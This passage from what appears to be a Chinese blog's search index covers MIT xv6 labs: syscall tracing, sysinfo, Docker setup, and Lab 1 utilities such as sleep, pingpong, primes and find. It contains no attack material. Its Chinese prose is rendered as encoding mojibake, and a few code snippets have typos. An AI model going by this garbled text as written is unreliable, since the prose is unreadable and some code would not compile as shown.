p-\u0026gt;lock need not be held. uint64 kstack; // Virtual address of kernel stack uint64 sz; // Size of process memory (bytes) pagetable_t pagetable; // User page table struct trapframe *trapframe; // data page for trampoline.S struct context context; // swtch() here to run process struct file *ofile[NOFILE]; // Open files struct inode *cwd; // Current directory char name[16]; // Process name (debugging) uint64 tracemask; // tracemask uint64 arg; // Extra: int arg }; kernel/proc.c è¿™é‡Œå®ç°traceæ©ç çš„åˆå§‹åŒ–å’Œforkå…‹éš† 1 2 3 4 5 6 7 8 9 10 11 12 static struct proc* allocproc(void) { // ... p-\u0026gt;tracemask = 0; } int fork(void) { // ... np-\u0026gt;tracemask = p-\u0026gt;tracemask; } kernel/syscall.c:syscall() è¿™é‡Œå®ç°æ‰“å°è¾“å‡ºéƒ¨åˆ† 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 void syscall(void) { int num; struct proc *p = myproc(); num = p-\u0026gt;trapframe-\u0026gt;a7; if(num \u0026gt; 0 \u0026amp;\u0026amp; num \u0026lt; NELEM(syscalls) \u0026amp;\u0026amp; syscalls[num]) { // Use num to lookup the system call function for num, call it, // and store its return value in p-\u0026gt;trapframe-\u0026gt;a0 p-\u0026gt;trapframe-\u0026gt;a0 = syscalls[num](); if (p-\u0026gt;tracemask \u0026amp; (1 \u0026lt;\u0026lt; num)) { // \u0026lt;\u0026lt; åˆ¤æ–­æ˜¯å¦éœ€è¦traceè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ printf(\u0026#34;%d: syscall %s -\u0026gt; %d\\n\u0026#34;, p-\u0026gt;pid, syscall_name[num], p-\u0026gt;trapframe-\u0026gt;a0); // syscall_nameæ•´ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„å³å¯ï¼Œæ³¨æ„ç¬¬0ä¸ªå…ƒç´ ç½®ç©º } } else { printf(\u0026#34;%d %s: unknown sys call %d\\n\u0026#34;, p-\u0026gt;pid, p-\u0026gt;name, num); p-\u0026gt;trapframe-\u0026gt;a0 = -1; } } Extraï¼šæ‰“å°å‚æ•° kernel/syscall.cä¸­è¿˜å®ç°äº†è·å–ç³»ç»Ÿè°ƒç”¨å‚æ•°çš„è¾…åŠ©å‡½æ•°ï¼šargint(int n, int *ip)ã€argstr(int n, char *buf, int max)ç­‰ã€‚æœ¬è´¨ä¸Šå°±æ˜¯è¯»é€šç”¨å¯„å­˜å™¨ã€‚\nå¦‚æœç›´æ¥åœ¨traceè¾“å‡ºæ—¶å†å»è¯»å¯„å­˜å™¨ï¼Œç”±äºæ­¤æ—¶ç³»ç»Ÿè°ƒç”¨å·²ç»ç»“æŸï¼Œæ— æ³•è·å–å‚æ•°ã€‚ä¸ºäº†å°†å‚æ•°ä¼ å›syscall()å…¥å£ï¼Œéœ€è¦ç»§ç»­ä¸ºprocç»“æ„ä½“æ·»åŠ ä¸€ä¸ªå­—æ®µã€‚åŒæ—¶hookè·å–å‚æ•°çš„å‡½æ•°ï¼š\n1 2 3 4 5 6 7 // Fetch the nth 32-bit system call argument. void argint(int n, int *ip) { *ip = argraw(n); myproc()-\u0026gt;arg = *ip; } è¿™é‡Œåªå±•ç¤ºäº†æå–ä¸€ä¸ªintï¼Œè‡³äºæ›´å¤æ‚çš„å‚æ•°ä¹Ÿåªæ˜¯å¢åŠ å¤„ç†é€»è¾‘è€Œå·²ã€‚\nLab2-2: sysinfo sysinfo ç³»ç»Ÿè°ƒç”¨æ”¶é›†è¿è¡Œæ—¶ç³»ç»Ÿä¿¡æ¯ã€‚å®éªŒç»™å‡ºäº†æ•°æ®ç»“æ„å®šä¹‰ï¼š\n1 2 3 4 struct sysinfo { uint64 freemem; // amount of free memory (bytes) uint64 nproc; // number of process }; å®Œå–„è°ƒç”¨é“¾çš„æ“ä½œå¤§åŒå°å¼‚ã€‚æˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸¤ä¸ªå­—æ®µçš„è·å–ï¼š\nfree memory bytes å®éªŒæŒ‡å¼•æˆ‘ä»¬æŸ¥çœ‹kernel/kalloc.cï¼š\n1 2 3 4 5 6 7 8 struct run { struct run *next; }; struct { struct spinlock lock; struct run *freelist; } kmem; å¯ä»¥çœ‹åˆ°è¿™ä¸ªç®€é™‹çš„åŠ¨æ€å†…å­˜ç®¡ç†æœºåˆ¶ä½¿ç”¨äº†å•é“¾è¡¨æ¥å­˜å‚¨å¯ç”¨å†…å­˜ã€‚äºæ˜¯ç©ºä½™å­—èŠ‚çš„æ•°é‡å°±æ˜¯å•é“¾è¡¨è¿›è¡Œæ±‚å’Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // kernel/kalloc.c uint64 kfreemem(void) { struct run *r; uint64 free = 0; acquire(\u0026amp;kmem.lock); // æ¨¡ä»¿kallocå‡½æ•°è¿›è¡Œä¸Šé” r = kmem.freelist; while (r) { free += PGSIZE; // PGSIZEå›ºå®š4096å­—èŠ‚ r = r-\u0026gt;next; } release(\u0026amp;kmem.lock); return free; } è‡³æ­¤åŠŸèƒ½å·²ç»å®Œæˆäº†ï¼Œä½†æ˜¯å¾ˆå¥‡æ€ªæ‰“åˆ†è„šæœ¬æ˜¯å¦‚ä½•è¯„åˆ†çš„ã€‚æŸ¥çœ‹user/sysintotest.cå¯ä»¥å‘ç°ä½¿ç”¨äº†sbrkç³»ç»Ÿè°ƒç”¨ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å¢åŠ æˆ–å‡å°‘è¿›ç¨‹çš„å †å¤§å°ã€‚äºæ˜¯è®¡ç®—ç©ºé—²å†…å­˜çš„é€»è¾‘æ˜¯ï¼šç”¨sbrkå¡«æ»¡æ‰€æœ‰å†…å­˜ï¼Œè®¡ç®—å¢åŠ çš„é¡µæ•°é‡ã€‚\nnumber of process è¿›ç¨‹ç®¡ç†çš„é€»è¾‘ä½äºkernel/proc.cï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // initialize the proc table. void procinit(void) { struct proc *p; initlock(\u0026amp;pid_lock, \u0026#34;nextpid\u0026#34;); initlock(\u0026amp;wait_lock, \u0026#34;wait_lock\u0026#34;); for(p = proc; p \u0026lt; \u0026amp;proc[NPROC]; p++) { initlock(\u0026amp;p-\u0026gt;lock, \u0026#34;proc\u0026#34;); p-\u0026gt;state = UNUSED; p-\u0026gt;kstack = KSTACK((int) (p - proc)); } } proc[NPROC]æ•°ç»„ç»´æŠ¤æ‰€æœ‰è¿›ç¨‹çš„procç»“æ„ä½“ã€‚è¿›ç¨‹çŠ¶æ€åœ¨procç»“æ„ä½“ä¸­ç”±ä¸€ä¸ªæšä¸¾æ ‡è®°ï¼š\n1 2 // kernel/proc.h enum procstate { UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE }; äºæ˜¯è®¡ç®—è¿›ç¨‹æ•°é‡å°±æ˜¯å¯¹åˆ—è¡¨ä¸­çŠ¶æ€ä¸æ˜¯UNUSEDçš„è¿›ç¨‹è¿›è¡Œæ±‚å’Œï¼›\n1 2 3 4 5 6 7 8 uint64 count_proc(void) { struct proc *p; uint64 count = 0; for(p = proc; p \u0026lt; \u0026amp;proc[NPROC]; p++) if(p-\u0026gt;state != UNUSED) count += 1; return count; } æœ€åæ³¨æ„åœ¨kenel/defs.hä¸­åŠ å…¥è¿™ä¸¤ä¸ªå‡½æ•°çš„å£°æ˜ã€‚\nExtraï¼šload average load averageçš„è®¡ç®—å…¬å¼åŸºæœ¬ä¸Šå°±æ˜¯ï¼š\nè¿è¡Œå’Œç­‰å¾…çš„è¿›ç¨‹æ•°/cpuå†…æ ¸æ•° å…³äºè¿›ç¨‹æ•°å·²ç»å®ç°äº†ï¼Œåªéœ€è¦ç»Ÿè®¡SED, SLEEPING, RUNNABLE, RUNNINGè¿™äº›çŠ¶æ€çš„è¿›ç¨‹å³å¯ã€‚\nå…³äºå†…æ ¸æ•°é‡ï¼Œkenel/param.hä¸­çš„NCPUå·²ç»æŒ‡å®šäº†æœ€å¤§å¤„ç†å™¨é€»è¾‘æ ¸æ•°é‡ã€‚\nè®¡ç®—è¾“å‡ºå³å¯ã€‚è€Œç°ä»£linuxç³»ç»Ÿè®¡ç®—load averageä¸€èˆ¬è¿˜è¦è®°å½•3åˆ†é’Ÿï¼Œ5åˆ†é’Ÿï¼Œ15åˆ†é’Ÿçš„æ•°å€¼ã€‚vx6å¯¹æ—¶é—´çš„æ”¯æŒå¹¶ä¸å‹å¥½ï¼Œæ­¤é¢˜å†è®®ã€‚\næ‰“ä¸ªåˆ†â‘§ ","date":"2023-12-10T00:00:00Z","image":"https://lonelyuan.github.io/p/xv6-syscall/gef_hu90ecd56e3ba7374c29b43604edbf6baf_169165_120x120_fill_box_smart1_3.png","permalink":"https://lonelyuan.github.io/p/xv6-syscall/","title":"XV6 Lab - SystemCalls"},{"content":" è¯¾ç¨‹ç®€ä»‹ï¼šMIT 6.S081: Operating System Engineering - CSè‡ªå­¦æŒ‡å— (csdiy.wiki) MITçš„CSè¯¾ç¨‹ä½“ç³»ä¸€ç›´åœ¨å‘å±•ï¼Œä¸ºé¿å…æ··æ·†è¿™é‡Œç®€å•æ¢³ç†ä¸€ä¸‹ï¼š 6.828ï¼š6.828 / Fall 2018 (mit.edu) æˆªè‡³2018å¹´ï¼Œ6.828è¯¾ç¨‹çš„å®éªŒä½¿ç”¨çš„æ˜¯åŸºäº x86 çš„ JOS 6.S081ï¼š6.S081 / Fall 2019 (mit.edu) 2019å¹´æ–°å¢6.S081ï¼ˆæ“ä½œç³»ç»Ÿå¯¼è®ºï¼‰ä½œä¸º6.828çš„é™„å±è¯¾ç¨‹ã€‚ä¸æ­¤åŒæ—¶å®éªŒéƒ¨åˆ†é¦–æ¬¡å‡çº§ä¸ºåŸºäº RISC-V çš„ xv6 éšååœ¨2020å¹´ä¸¤é—¨è¯¾åˆ†ç¦»ã€‚6.S081ä½œä¸ºæœ¬ç§‘ç”Ÿè¯¾ç¨‹ç»§ç»­å‘æŒ¥å¯¼è®ºçš„ä½œç”¨ã€‚è€Œ6.828ä½œä¸ºé¢å‘ç ”ç©¶ç”Ÿçš„ç ”è®¨è¯¾ç ”ç©¶æ›´å‰æ²¿çš„è¯¾é¢˜ã€‚ 6.1810ï¼š6.1810 / Fall 2023 (mit.edu) 2022å¹´ï¼Œè¯¾ç¨‹å·æ›´æ–°ä¸º 6.5810ï¼ˆåŸ 6.828ï¼‰å’Œ 6.1810ï¼ˆåŸ 6.S081ï¼‰ é…ç¯å¢ƒï¼šåŸºäºDockerçš„å®éªŒç¯å¢ƒæ­å»º å®˜ç½‘æ–‡æ¡£ååˆ†è¯¦ç»†ï¼š\nLab: Xv6 and Unix utilities (mit.edu) åœ¨æœ¬ç³»åˆ—å®éªŒä¸­ï¼Œæ¯ä¸ªå®éªŒåªå…³æ³¨æ“ä½œç³»ç»Ÿçš„æŸä¸ªéƒ¨åˆ†ï¼Œå› æ­¤ä¸åŒå®éªŒç”¨gitç®¡ç†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@55724e7ba091:/xv6-labs-2023# git branch -r origin/HEAD -\u0026gt; origin/util origin/cow origin/debugging-demo origin/fs origin/lock origin/mmap origin/net origin/pgtbl origin/riscv origin/syscall origin/thread origin/traps origin/util äºæ˜¯è¦åˆ‡æ¢åˆ°æŸä¸ªå®éªŒåªéœ€git switch -c \u0026lt;branch\u0026gt;åˆ‡æ¢åˆ†æ”¯å³å¯ã€‚å½“ç„¶è¦æ³¨æ„ä¿å­˜å½“å‰branchçš„ç»“æœã€‚\næœ€åç»™å‡ºæˆ‘çš„dockerfileï¼š\n1 2 3 4 5 6 FROM ubuntu:20.04 ENV DEBIAN_FRONTEND=noninteractive RUN sed -i \u0026#39;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g\u0026#39; /etc/apt/sources.list RUN apt-get update RUN apt-get install -y git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu RUN git clone git://g.csail.mit.edu/xv6-labs-2023 \u0026amp;\u0026amp; cd xv6-labs-2023 XV6ï¼Œå¯åŠ¨ï¼ QEMUï¼ˆQuick Emulatorï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„è™šæ‹ŸåŒ–å’Œæ¨¡æ‹Ÿå™¨å·¥å…·ï¼Œå®ƒå¯ä»¥æ¨¡æ‹Ÿå¤šä¸ªç¡¬ä»¶æ¶æ„ï¼ŒåŒ…æ‹¬x86ã€ARMã€MIPSç­‰ã€‚QEMUæ”¯æŒåœ¨ä¸»æœºç³»ç»Ÿä¸Šæ¨¡æ‹Ÿè™šæ‹Ÿæœºï¼Œå¹¶æä¾›äº†ä¸€ç§çµæ´»çš„æ–¹å¼æ¥è¿›è¡Œè™šæ‹ŸåŒ–å¼€å‘å’Œæµ‹è¯•ã€‚â€”â€”from GPT\nç¯å¢ƒé…å¥½åï¼Œè¿è¡Œmake qemuå³å¯è¿›å…¥xv6ç³»ç»Ÿã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 xv6 kernel is booting hart 1 starting hart 2 starting init: starting sh $ ls . 1 1 1024 .. 1 1 1024 README 2 2 2305 xargstest.sh 2 3 93 cat 2 4 32312 echo 2 5 31184 forktest 2 6 15296 grep 2 7 35664 init 2 8 31984 kill 2 9 31192 ln 2 10 31104 ls 2 11 34224 mkdir 2 12 31232 rm 2 13 31208 sh 2 14 53464 stressfs 2 15 32080 usertests 2 16 180664 grind 2 17 47288 wc 2 18 33312 zombie 2 19 30760 console 3 20 0 å¯ä»¥å‘ç°è¿™é‡Œçš„å¯æ‰§è¡Œæ–‡å¯¹åº”ç€é¡¹ç›®æ–‡ä»¶å¤¹é‡Œuserç›®å½•ä¸‹çš„æºä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´ç›®å‰æˆ‘ä»¬å¤„äºç”¨æˆ·æ€ã€‚But how it worksï¼Ÿ\nç”±äºæ‰§è¡Œçš„æ˜¯makeæŒ‡ä»¤ï¼Œå½“ç„¶è¦å»é˜…è¯»Makefileäº†ï¼š\n1 2 3 4 5 6 7 QEMUOPTS = -machine virt -bios none -kernel $K/kernel -m 128M -smp $(CPUS) -nographic QEMUOPTS += -global virtio-mmio.force-legacy=false QEMUOPTS += -drive file=fs.img,if=none,format=raw,id=x0 QEMUOPTS += -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 qemu: $K/kernel fs.img $(QEMU) $(QEMUOPTS) è¿™é‡ŒçœŸæ­£å¯åŠ¨äº†qemuç¨‹åºï¼Œç³»ç»Ÿçš„å†…æ ¸ã€æ–‡ä»¶ç³»ç»Ÿéƒ½åœ¨QEMUOPTSä¸­æŒ‡å®šã€‚è€Œæˆ‘ä»¬çš„ç”¨æˆ·æ€ç¨‹åºéƒ½ä½äºfs.imgå†…ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 UPROGS=\\ $U/_cat\\ $U/_echo\\ $U/_forktest\\ $U/_grep\\ $U/_init\\ $U/_kill\\ $U/_ln\\ $U/_ls\\ $U/_mkdir\\ $U/_rm\\ $U/_sh\\ $U/_stressfs\\ $U/_usertests\\ $U/_grind\\ $U/_wc\\ $U/_zombie\\ fs.img: mkfs/mkfs README $(UEXTRA) $(UPROGS) mkfs/mkfs fs.img README $(UEXTRA) $(UPROGS) è¿™é‡Œè®©mkfsç¨‹åºå°†æ–‡ä»¶ç³»ç»Ÿæ„å»ºæˆimgæ ¼å¼çš„é•œåƒã€‚ç”¨æˆ·æ€ç¨‹åºéƒ½åŒ…å«åœ¨UPROGSå˜é‡ä¸­ã€‚é‚£ä¹ˆè¿™äº›ä¸‹åˆ’çº¿å¼€å¤´çš„å¯æ‰§è¡Œæ–‡ä»¶åˆæ˜¯è°ç¼–è¯‘çš„å‘¢ï¼š\n1 2 3 4 _%: %.o $(ULIB) $(LD) $(LDFLAGS) -T $U/user.ld -o $@ $^ $(OBJDUMP) -S $@ \u0026gt; $*.asm $(OBJDUMP) -t $@ | sed \u0026#39;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d\u0026#39; \u0026gt; $*.sym è¿™é‡Œæ¶‰åŠåˆ°Makefileçš„ä¸€ä¸ªé€šç”¨æŠ€å·§ï¼š-o $@ $^ä¸­çš„$@è¡¨ç¤ºå½“å‰ç›®æ ‡ä¹Ÿï¼Œå³_%ï¼Œ$^è¡¨ç¤ºå½“å‰çš„ä¾èµ–ï¼Œå³%.o $(ULIB)ã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“è¿™ä¸€æ­¥æ‰§è¡Œçš„æ˜¯é“¾æ¥æ“ä½œï¼Œé‚£ä¹ˆç¼–è¯‘åˆæ˜¯è°å¹²çš„å‘¢ï¼Ÿ\nä¼Ÿå¤§çš„gptè€å¸ˆå‘Šè¯‰æˆ‘ä»¬ï¼Œmakefileä¸­å­˜åœ¨è¿™æ ·çš„éšå«è§„åˆ™ï¼Œä»–ä¼šè‡ªåŠ¨ä¸º.oæ–‡ä»¶å¯»æ‰¾.cæ¥ç¼–è¯‘ï¼š\n1 2 %.o: %.c $(CC) -c $(CFLAGS) $\u0026lt; -o $@ ç»ˆäºæ‹é¡ºäº†ã€‚è™½ç„¶æˆ‘ä»¬å¯¹æ“ä½œç³»ç»Ÿå†…æ ¸çš„è®¤è¯†è¿˜å¾ˆé»‘ç®±ï¼Œä½†è¿™äº›è¯´çš„é“ç†è¶³ä»¥å®Œæˆç¬¬ä¸€ä¸ªå®éªŒäº†ã€‚\nLab1 Utils ç¬¬ä¸€ä¸ªå®éªŒè¦æ±‚å®Œæˆç¼–å†™å‡ ä¸ªç”¨æˆ·æ€å‡½æ•°ï¼Œé¦–å…ˆè¦æ˜ç¡®ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ˜¯åœ¨ä¸€ä¸ªå…¨æ–°çš„æ“ä½œç³»ç»Ÿï¼Œå·²ç»æ²¡æœ‰libcå¯ç”¨äº†ï¼æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨çš„åªæœ‰XV6æä¾›çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶å®šä¹‰éƒ½åœ¨user/user.hä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 struct stat; // system calls int fork(void); int exit(int) __attribute__((noreturn)); int wait(int*); int pipe(int*); int write(int, const void*, int); int read(int, void*, int); int close(int); int kill(int); int exec(const char*, char**); int open(const char*, int); int mknod(const char*, short, short); int unlink(const char*); int fstat(int fd, struct stat*); int link(const char*, const char*); int mkdir(const char*); int chdir(const char*); int dup(int); int getpid(void); char* sbrk(int); int sleep(int); int uptime(void); // ulib.c int stat(const char*, struct stat*); char* strcpy(char*, const char*); void *memmove(void*, const void*, int); char* strchr(const char*, char c); int strcmp(const char*, const char*); void fprintf(int, const char*, ...); void printf(const char*, ...); char* gets(char*, int max); uint strlen(const char*); void* memset(void*, int, uint); void* malloc(uint); void free(void*); int atoi(const char*); int memcmp(const void *, const void *, uint); void *memcpy(void *, const void *, uint); Lab1-1: sleep sleep iå‘½ä»¤è¦æ±‚è¿›ç¨‹æš‚åœä¸€å®šæ—¶é—´ã€‚è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ—¶é—´é‡ï¼Œå…¶å•ä½åˆ™æ˜¯ç³»ç»Ÿå®šä¹‰çš„tickã€‚\nå¤©ä¸‹ä»£ç ä¸€å¤§æŠ„ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°killæŒ‡ä»¤çš„è¾“å…¥å’Œsleepå·®ä¸å¤šï¼Œéƒ½æ˜¯æ•´æ•°ï¼Œåªä¸è¿‡killå¯ä»¥æ¥å—å¤šä¸ªè¾“å…¥ã€‚è€Œkillå’Œsleepéƒ½æœ‰ç³»ç»Ÿè°ƒç”¨çš„å®šä¹‰ï¼Œå› æ­¤ç›´æ¥æŠ„è¿‡æ¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; int main(int argc, char **argv){ if(argc != 2){ fprintf(2, \u0026#34;usage: sleep tick\\n\u0026#34;); exit(1); } int ret = sleep(atoi(argv[1])); exit(ret); } å®Œæˆä»£ç ç¼–å†™åæŒ‰è§„åˆ™è®²sleepåŠ å…¥UPROGSå‚æ•°ï¼Œæœ€åæ‰§è¡Œè¯„åˆ†è„šæœ¬ï¼š\n1 2 3 4 5 6 root@55724e7ba091:/xv6-labs-2023# ./grade-lab-util sleep make: \u0026#39;kernel/kernel\u0026#39; is up to date. == Test sleep, no arguments == sleep, no arguments: OK (1.4s) == Test sleep, returns == sleep, returns: OK (0.9s) == Test sleep, makes syscall == sleep, makes syscall: OK (1.0s) (Old xv6.out.sleep failure log removed) Extra: uptime å®éªŒæ–‡æ¡£ä¸­çš„æœ€åç»™å‡ºäº†ä¸€äº›éšè—å…³ï¼Œç¬¬ä¸€å…³è¦æ±‚å®ç°uptimeï¼Œä¹Ÿæ˜¯æ‰æ¥å£ï¼Œæ¯”sleepæ›´ç®€å•ï¼š\n1 2 3 4 5 6 7 #include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; int main(int argc, char **argv){ fprintf(2, \u0026#34;uptime: %d\\n\u0026#34;, uptime()); exit(0); } Lab1-2: pingpong pingpongå‘½ä»¤å°†åˆ›å»ºä¸¤ä¸ªè¿›ç¨‹ï¼Œå¹¶é€šè¿‡ç®¡é“åœ¨ä¸¤ä¸ªè¿›ç¨‹é—´é€šä¿¡ä¸€ä¸ªå­—èŠ‚ã€‚å®˜æ–¹æ–‡æ¡£å¯¹è¿™ä¸ªå‘½ä»¤çš„å®ç°æè¿°çš„å¾ˆæ¸…æ¥šäº†ï¼š\nUseÂ pipeÂ to create a pipe. UseÂ forkÂ to create a child. UseÂ readÂ to read from a pipe, andÂ writeÂ to write to a pipe. UseÂ getpidÂ to find the process ID of the calling process. éœ€è¦æ³¨æ„intÂ pipe(intÂ fd[2])ä»…æ”¯æŒå•å‘é€šä¿¡ï¼Œè¾“å…¥æ˜¯ä¸¤ä¸ªfdåˆ†åˆ«è¡¨ç¤ºè¯»/å†™ã€‚å› æ­¤è¯»å’Œå†™éœ€è¦ä¸¤ä¸ªpipeã€‚pipeè¿”å›fdä¹‹åï¼Œå†æ‰§è¡Œforkå³å¯è®©çˆ¶å­ä¸¤ä¸ªè¿›ç¨‹å…±äº«ç›¸åŒçš„pipeã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; int main(int argc, char *argv[]) { int pid, p1[2], p2[2]; char buf[] = {\u0026#39;?\u0026#39;}; pipe(p1); pipe(p2); int ret = fork(); if (ret == 0) { // è¿”å›0è¡¨ç¤ºå­è¿›ç¨‹ pid = getpid(); read(p1[0], buf, 1); printf(\u0026#34;%d: received ping\\n\u0026#34;, pid); write(p2[1], buf, 1); exit(0); } else { pid = getpid(); write(p1[1], buf, 1); read(p2[0], buf, 1); printf(\u0026#34;%d: received pong\\n\u0026#34;, pid); exit(0); } } Lab1-3: primes åœ¨ä¸Šä¸€ä¸ªç¨‹åºçš„åŸºç¡€ä¸Šï¼Œprimeså¸Œæœ›ä½¿ç”¨å¤šè¿›ç¨‹æœºåˆ¶å®ç°ç´ æ•°ç­›ã€‚å…·ä½“æµç¨‹ä¸ºï¼š\næ¯ä¸ªè¿›ç¨‹é€šè¿‡ç®¡é“ä»å…¶å·¦é‚»å±…è¯»å–æ•°æ®ï¼Œå¹¶é€šè¿‡å¦ä¸€ä¸ªç®¡é“å†™å…¥å…¶å³é‚»å±…ã€‚ æ¯ä¸ªè¿›ç¨‹ä»£è¡¨ä¸€ä¸ªç´ æ•°ï¼Œå¹¶åˆ¤æ–­ä¼ æ¥çš„æ•°æ˜¯å¦æ˜¯è‡ªå·±çš„å€æ•°ã€‚å½“é‡åˆ°æ–°çš„ç´ æ•°æ—¶ï¼Œåˆ›å»ºæ–°çš„å­è¿›ç¨‹ã€‚ å› æ­¤ï¼Œé’ˆå¯¹ç¬¬ä¸€æ­¥ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½ä¿æŒä¸¤ä¸ªç®¡é“ï¼Œä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œä¸æ–­è¿›è¡Œâ€è¯»â†’åˆ¤æ–­â†’å†™â€œçš„å¾ªç¯ã€‚\n1 2 3 4 5 6 7 8 9 int me = 0, tmp = 0; int read_pipe[2], write_pipe[2]; while (1) { read(read_pipe[0], \u0026amp;tmp, 4); // ä»å·¦è¾¹è¯» if (tmp % me != 0) { try_fork(); write(write_pipe[1], \u0026amp;tmp, 4); // å¾€å³è¾¹å†™ } } é’ˆå¯¹ç¬¬äºŒæ­¥ï¼Œå½“ä¸”ä»…å½“ä¸è¢«ä»»ä½•ä¸€ä¸ªè¿›ç¨‹çš„æ•°æ•´é™¤çš„æ—¶å€™è¿›è¡Œforkã€‚ä¹Ÿå°±æ˜¯å½“è¾“å…¥çš„æ•°æµåŠ¨åˆ°æœ€å/æœ€æ–°çš„è¿›ç¨‹çš„æ—¶å€™ã€‚å› æ­¤éœ€è¦ä¸€ä¸ªçŠ¶æ€å˜é‡åˆ¤æ–­è‡ªå·±æ˜¯å¦æ˜¯æœ€æ–°è¿›ç¨‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int me = 0, tmp = 0, forked=0; int read_pipe[2], write_pipe[2]; while (1) { read(read_pipe[0], \u0026amp;tmp, 4); if (tmp % me != 0) { if (!forked) { pipe(write_pipe); // åˆå§‹åŒ–ç®¡é“ forked = 1; if (fork() == 0) { // å­è¿›ç¨‹é‡æ–°è¿›è¡Œåˆå§‹åŒ– read_pipe[0] = write_pipe[0]; // è¯»å†™ç®¡é“äº¤æ¢ forked = 0; me = 0; } } write(write_pipe[1], \u0026amp;tmp, 4); } } æœ€åï¼Œä¸»å‡½æ•°åº”è¯¥å‘ç®¡é“ä¸­å†™å…¥35ä¸ªæ•°ï¼Œå¹¶ä¸”å®Œæˆå…³é—­å¤šä½™çš„fdï¼Œç»ˆæ­¢æ¡ä»¶ç­‰æ“ä½œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include \u0026#34;kernel/types.h\u0026#34; #include \u0026#34;user/user.h\u0026#34; int main(int argc, char *argv[]) { int me = 0, tmp = 0, forked=0; int read_pipe[2], write_pipe[2]; pipe(read_pipe); for (int i = 2; i \u0026lt;= 35; i++) write(read_pipe[1], \u0026amp;i, 4); // åˆå§‹å…ˆå¾€read_pipeé‡Œå†™æ»¡ close(read_pipe[1]); while (1) { if(read(read_pipe[0], \u0026amp;tmp, 4)){ if (me == 0) { me = tmp; printf(\u0026#34;prime %d\\n\u0026#34;, me); } if (tmp % me != 0) { if (!forked) { pipe(write_pipe); forked = 1; if (fork() == 0) { close(write_pipe[1]); // å­è¿›ç¨‹çš„write_pipeå°šæœªå¼€å‘ close(read_pipe[0]); read_pipe[0] = write_pipe[0]; forked = 0; me = 0; } else close(write_pipe[0]); } if (forked) write(write_pipe[1], \u0026amp;tmp, 4); } } else { // æ‰€æœ‰æ•°éƒ½è¯»å®Œäº†ï¼Œç­‰å¾…å­è¿›ç¨‹é€€å‡º close(read_pipe[0]); if (forked) { close(write_pipe[1]); int child_pid; wait(\u0026amp;child_pid); } exit(0); } } } Lab1-4: find findæŒ‡ä»¤è¦æ±‚åœ¨ç‰¹å®šåç§°çš„ç›®å½•æ ‘ä¸­æŸ¥æ‰¾æ–‡ä»¶ã€‚ç¨‹åºå¤§éƒ¨åˆ†å¯ä»¥å€Ÿé‰´lsçš„å®ç°ï¼Œåªéœ€è¦åœ¨è¾“å‡ºçš„æ—¶å€™æ‰§è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¹¶ä¸”å®ç°é€’å½’æŸ¥æ‰¾ã€‚ä¸è¿‡é¦–å…ˆè¦äº†è§£æ–‡ä»¶ç³»ç»Ÿçš„æ¥å£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 // kernel/fs.h struct dirent { // Directory is a file containing a sequence of dirent structures. ushort inum; char name[DIRSIZ]; }; // kernel/stat.h struct stat { // æ–‡ä»¶çŠ¶æ€ç»“æ„ä½“ int dev; // File system\u0026#39;s disk device uint ino; // Inode number short type; // Type of file short nlink; // Number of links to file uint64 size; // Size of file in bytes }; äºæ˜¯éå†ç›®å½•çš„æ“ä½œé€šå¸¸ä¸ºï¼š\n1 2 3 4 5 6 7 fd = open(path, O_RDONLY)) \u0026lt; 0); fstat(fd, \u0026amp;st); switch(st.type){ case T_DIVICE: ... case T_FILE: ... case T_DIR: ... } äºæ˜¯åœ¨T_DIRåˆ†æ”¯å†…å®ç°é€’å½’ï¼Œåœ¨T_FILEåˆ†æ”¯å†…æŸ¥æ‰¾å­—ç¬¦ä¸²å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 switch(st.type){ case T_FILE: if(match(path, pattern)\u0026gt;=0) printf(\u0026#34;%s\\n\u0026#34;, path); break; case T_DIR: strcpy(buf, path); p = buf+strlen(buf); *p++ = \u0026#39;/\u0026#39;; while(read(fd, \u0026amp;de, sizeof(de)) == sizeof(de)){ if (de.inum == 0 || trcmp(de.name, 